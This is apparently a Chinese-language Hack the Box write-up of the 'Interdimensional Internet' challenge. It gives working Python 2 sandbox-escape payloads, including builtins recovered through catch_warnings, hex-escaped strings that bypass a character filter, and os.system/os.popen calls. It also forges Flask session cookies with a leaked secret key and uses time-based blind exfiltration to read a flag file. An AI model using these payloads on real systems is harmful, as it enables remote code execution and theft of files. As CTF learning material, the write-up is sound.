---
title: "Hack the Box——Interdimensional Internet"
date: 2020-02-21T09:33:17+08:00
showDate: true
draft: true
tags: ["security","hack the box", "ctf"]
categories: ["security"]
---

# Interdimensional Internet

## 剧透警告

如果你正在做或者将要去做这道题，最好先不要看，否则一切都将索然无味~

## day1

上来访问url就是一个很赛博朋克的背景图片加上rick & morty的gif还有一串神秘数字

![1](1.png)

刷新一下数字就变了，看下响应的html

![2](2.png)


好像除了引入了一些静态文件其它也没什么特殊的东西（其实有，只是一开始没发现）。


再刷新几次发现服务端好像每次都返回新的Cookie, 服务端是`Werkzeug/0.16.0 Python/2.7.17`

![3](3.png)


那这个cookie就很可疑了。

这个session的值看起来好像是jwt，jwt的头部是直接用base64解码的。

解码出来的结果是

`{"ingredient":{" b":"bnR0cXB5eHNvdA=="},"measurements":{" b":"MzYtMTI="}}`

里面好像还有base64编码的字符串，把里面的字符串也解码看看

`bnR0cXB5eHNvdA==` => `nttqpyxsot`

`MzYtMTI=` = `36-12`

`measurements`的36-12好像对应的是当前展示在页面的值，那这个`ingredient`有什么用呢？下一次将要返回的值的某种密码？

那就试试多跑几次，找找规律，用脚本跑了1000个出来，这好像没什么规律


![4](./4.png)

### 获取源码

那看来可能方向有点问题了。带着这个疑惑再去看看html的内容，有个`<!-- /debug -->`的注释，尝试访问`/debug`。

WOW！是服务端源码

![5](5.png)

### 梳理逻辑

复制到ide里仔细审计一下。

访问`/`之后的流程大概是

* 1.获取`session`的`ingredient`和`measurements`,用他们拼接`recipe`变量

* 2.判断`session`里是否存在`ingredient`和`measurements`，还有`ricepe`是否大于等于20

* 3.如果上面任意一个不满足，ingredient为长度为10的随机小写字母串，measurements为随机数学算式， 然后放到exec里面以ingredient为变量measurements为值并返回结果。（这也是为什么之前找规律没找不来，根本就没规律嘛）

* 如果上面条件都满足，再判断传进来的recipe里面含不含有`[`, `(`, `_`, `.`，含的话直接拦截并返回

* 如果不含，就exec recipe

### 构造payload


流程大概是清楚了，那作者的目的也明确是，就是要我们通过构造一个exec表达式来拿flag，而且这个表达式还不能还有某些字符。


那能hack的地方就是calc函数了

```python
def calc(recipe):
    global garage
    builtins, garage = {'__builtins__': None}, {}
    try:
        exec(recipe, builtins, garage)
    except Exception as e:
        print e
```

查了下关于exec函数的参数，后面两个参数一个是指定全局作用域一个是指定局部作用域

先试试简单粗暴的payload

```python
if __name__ == '__main__':
    recipe = '''
import os
os.system('sleep 3')
'''
    calc(recipe)
```

#### 关于__builtins__

直接报错`__import__ not found`，看来事情并不简单。

再查下关于python2的`__builtins__`，`__builtins__`即是模块的`__dict__`方法的返回值，也是模块全局变量的一部分（来自对官方文档的生硬人翻）。

从下图可以看出，对于解释器，默认的`__builtins__`其实就是`__builtin__.__dict__`的引用

![6](6.png)

（note：这个只是在2.7的情况，在3中并不适用，很多人写关于`__builtin__`的时候不注明版本真的很容易误导人）

这时候作者的意图就进一步明确了，在不使用内置函数的情况下hack。搜了一下相关内容，原来这个就是沙盒逃逸。

但是大部分题目都只是删掉了`__builtins__`里的某些危险函数，比如`exec`, `eval`, `__import__`这种。而且没有字符绕过这种姿势。

因为之前没接触过这方面，只能慢慢查资料。

然后发现freebug上有篇文章的最后好像有点像我这种例子。[链接](https://www.freebuf.com/articles/system/203208.html)

![7](7.png)

这题的情况就是在自定义的全局命名空间里，也就是`restricted execution mode`。

但是文章里的payload好像并不是很完整，而且他可以用`__import__`，这题好像不能。

#### 寻找其它解决办法

既然内置函数全都挂了，那还有什么其它的解决办法呢？python的关键字应该还有有效吧。试了下`print`关键字存活，那可以去看看python2还有哪些关键字，
找找有没有可以利用的。

```

and       del       from      not       while
as        elif      global    or        with
assert    else      if        pass      yield
break     except    import    print
class     exec      in        raise
continue  finally   is        return
def       for       lambda    try
```

原来exec在python2里是关键字，那是不是在可以在payload里用exec来避开`restricted execution mode`呢?试试吧

```python
if __name__ == '__main__':
    recipe = '''
exec "import os"
'''
    calc(recipe)
```

结果还是`__import__ not found`，里面的exec应该用的是外面的全局命名空间，外面的是None里面的肯定也是。

继续查资料。

我查到`reddit`有个作死的python玩家在玩如果把全局命名空间删了然后手动恢复[Ask /r/Python: Recovering cleared globals](https://www.reddit.com/r/Python/comments/hftnp/ask_rpython_recovering_cleared_globals/)


下面第一个评论有正解

`__builtins__ = [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__`

原理就是通过基础类型访问到`object`类型然后找到跟初始`__builtins__`一样的子类然后恢复。

做成payload尝试一下

```python
if __name__ == '__main__':
    recipe = '''
__builtins__ = [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__
__builtins__['__import__']('os').system('whoami')
'''
    calc(recipe)
```

it works!

![8](8.png)

`__builtins__`的问题解决了，但是payload里还有一堆禁用字符。

## day2

### 绕过禁用字符

有禁用字符的存在，上面的payload还是无法使用。一开始想的是不用这些字符寻找其它办法能不能达到上面一样的效果，但是并没有找到。

那能不能用其它字符代替呢？试试用hex来代替。先看看禁用字符的hex值。

![9](9.png)

python里字符串使用\xab来表示字符的。

尝试一下payload

```python
if __name__ == '__main__':
    recipe = '''
b = \x5b]
print b
'''
    if re.search(r'\[|\(_\.', recipe):
        print 'invalid payload'
    calc(recipe)
```

这样好像并不可以，\x5b和[在python里应该是等价的。

但是这种包裹在字符串里然后并且\被\转义的\5b好像能绕过。

```python
if __name__ == '__main__':
    recipe = '''
b = "\\x5b]"
print b
'''
    if re.search(r'\[|\(_\.', recipe):
        print 'invalid payload'
    calc(recipe)
```

成功的打印出了结果并且没有被检测出来，`\\x5b`在第一层字符串里应该是被看成字符串`\x5b`,然后在第二次又被解析成`[`，所以能绕过检测并且达到效果。

![10](10.png)

那只要把print改成exec就可以把b当成一个语句执行了。

```python
if __name__ == '__main__':
    recipe = '''
b = "builtins = \\x5bi for i in \\x28)\\x2e\\x5f\\x5fclass\\x5f\\x5f\\x2e\\x5f\\x5fbases\\x5f\\x5f\\x5b0]\\x2e\\x5f\\x5fsubclasses\\x5f\\x5f\\x28) if i\\x2e\\x5f\\x5fname\\x5f\\x5f=='catch\\x5fwarnings']\\x5b0]\\x28)\\x2e\\x5fmodule\\x2e\\x5f\\x5fbuiltins\\x5f\\x5f"
exec b
print builtins
'''
    if re.search(r'\[|\(_\.', recipe):
        print 'invalid payload'
    calc(recipe)
```

成功的把builtins带出来了。

也可以通过这个来执行系统命令。

```python
if __name__ == '__main__':
    recipe = '''
b = "builtins = \\x5bi for i in \\x28)\\x2e\\x5f\\x5fclass\\x5f\\x5f\\x2e\\x5f\\x5fbases\\x5f\\x5f\\x5b0]\\x2e\\x5f\\x5fsubclasses\\x5f\\x5f\\x28) if i\\x2e\\x5f\\x5fname\\x5f\\x5f=='catch\\x5fwarnings']\\x5b0]\\x28)\\x2e\\x5fmodule\\x2e\\x5f\\x5fbuiltins\\x5f\\x5f"
exec b
exec "builtins\\x5b'\\x5f\\x5fimport\\x5f\\x5f']\\x28'os')\\x2esystem\\x28'whoami')"
'''
    if re.search(r'\[|\(_\.', recipe):
        print 'invalid payload'
    calc(recipe)
```

![11](11.png)


### 构造真正的payload

因为知道密钥，所以思路就是本地搭一个用它的密钥的flask app，通过访问它可以把我们做的payload变成session然后用session发请求

核心代码如下

```python
app.config['SECRET_KEY'] = environ.get('SECRET_KEY', 'eA2b8A2eA1EADa7b2eCbea7e3dAd1e')

@app.route("/")
def index():
    session["ingredient"] = 'a'
    session["measurements"] = \
'''1
exec "i={}\\x2e\\x5f\\x5fclass\\x5f\\x5f\\x2e\\x5f\\x5fbase\\x5f\\x5f\\x2e\\x5f\\x5fsubclasses\\x5f\\x5f\\x28)\\x5b59]\\x28)\\x2e\\x5fmodule\\x2e\\x5f\\x5fbuiltins\\x5f\\x5f\\x5b'\\x5f\\x5fimport\\x5f\\x5f']\\ni\\x28'os')\\x2esystem\\x28'sleep 3')"'''
    return "<p>{}</p>".format(session["measurements"])
```

因为知道网站源码，可以把他的代码跑在本地方便测试。

先在本地测试，访问本地的服务，因为执行的命令是`sleep 3`，执行结果也达到了预期

![12](12.png)

但是当我激动的访问远程服务器的时候，却并没有预期的响应时间。

![13](13.png)

这下有点懵了。为什么本地跑可以，那边却不行。难道它这个源码是假的？

后面试了好几个命令比如`echo`、`curl`，`wget`甚至`reboot`结果都一样——本地可以，远程不行。

## day3

### 用time.sleep

前一天问题没有解决，就跑去刷剧了。依然是没有头绪。无奈去htb的论坛看了下大家的讨论，有个人把sleep和print放在一起，让我想到time模块也有个sleep,
我可以用这个来测一测到底是方向错了还是system函数用不了。

试了下
```python
session["measurements"] = \
'''1
exec "i={}\\x2e\\x5f\\x5fclass\\x5f\\x5f\\x2e\\x5f\\x5fbase\\x5f\\x5f\\x2e\\x5f\\x5fsubclasses\\x5f\\x5f\\x28)\\x5b59]\\x28)\\x2e\\x5fmodule\\x2e\\x5f\\x5fbuiltins\\x5f\\x5f\\x5b'\\x5f\\x5fimport\\x5f\\x5f']\\ni\\x28'time')\\x2esleep\\x283)"'''
```

这回服务端终于有响应了，多次测试都是3秒多才响应。看来time模块是有用的。


然后还有人提到`I took to blindfolded sleeping to exfiltrate my flag, one wink at a time.`，听起来就有点像通过基于时间的盲注来获取结果。

那这个题目是不是也是这种效果呢。通过`time.sleep`来控制返回时间。

我用`if os.uname()[0]=='Linux':time.sleep(3)`测了一下，本地和服务端都有效。

为了拿到更多信息，去查了下os的文档，可以通过os.listdir来查文件名，那就可以通过类似`os.listdir(path).__len__()==n:sleep(1)`来猜当前path中的文件数量

然后用`os.listdir(path)[file_index][char_index]=='char':sleep(1)`来猜文件名，因为是为了测试服务的代码，所以写的比较乱，就不贴了。

现在本地测试，直接上运行结果

![14](14.png)

成功的爆出了文件名。

再上服务端测试（这里因为他们的服务器不在中国，我在本地发请求总是超时，基于时间的盲测根本测不出来。挂代理的效果也不理想，我唯一想到的办法就是去搞台国外的vps。最后无奈只能去阿里云买了一台按量付费的，100起充真是狠）


服务端测出来的结果和我想象的差不多，比我本地多一个flag文件，作者把文件名搞这么长显然是因为让我们在`if len(recipe)>=305:return f(*a, *kwargs)`也踩坑。

![15](15.png)

当前目录一共三个文件(夹)

* templates
* app.py
* totally_not_a_loooooooong_flaaaaag

显然flag肯定在第三个文件，那怎么读这个文件的内容呢?

查了下可以用`os.popen(command).read()`获取执行结果。

那就直接`os.popen('cat totally_not_a_loooooooong_flaaaaag').read()`就好了。

试了下长度超过了305，不能执行。

怎么把文件名变短一点呢,我想到了用ls+grep+xargs

用`os.popen('ls|grep to|xargs wc -m').read()`获取文件字符数量
然后用`os.popen('ls|grep to|xargs cat').read()`获取内容

跑一下脚本，终于拿到了flag


![16](16.png)

## 总结

历时三天，终于拿下了这道题。第一次花这么久做这道题，怪不得50%多的人给它投的难度是`Brainfuck`，确实有点难，而且很多细节。我踩的坑远比上面写的要多。

比如我以为是python版本问题还专门换了python版本（从2.7.12改成2.7.17）

以为是操作系统的问题还专门做了docker。

之所以不能写文件是因为运行的用户不是root而且权限全是只读等等。

曾经一度想看答案，最后还是忍住了（其实是搜不到答案，github有writeup但是需要flag做密码）。

而且我看了答案可能就没有最后拿到flag的喜悦，也没有动力把这一切记录下来了~